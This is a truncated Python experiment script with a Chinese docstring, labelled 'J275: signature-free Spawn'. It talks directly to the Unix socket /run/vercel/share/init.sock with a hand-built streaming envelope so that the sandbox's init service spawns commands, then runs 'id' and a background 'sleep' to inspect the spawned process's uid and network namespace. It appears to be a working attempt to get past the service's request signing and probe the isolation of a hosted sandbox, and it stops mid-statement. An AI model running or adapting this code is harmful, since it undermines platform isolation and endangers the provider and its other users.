# -*- coding: utf-8 -*-
"""实验J275: 免签 Spawn (envelope 消息格式修正)
connect streaming envelope: \x00 + uint32be(len) + json
A: patch
B: Spawn id (envelope) -> r3 + marker
D: Spawn sleep 60 & -> 观察进程 uid/netns
"""
...
def spawn_req(command, args, outfile, timeout=20):
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect("/run/vercel/share/init.sock")
        import json as _j
        msg = _j.dumps({"command": command, "args": args, "env": {}}).encode()
        body = b"\x00" + struct.pack(">I", len(msg)) + msg  # connect envelope
        req = (
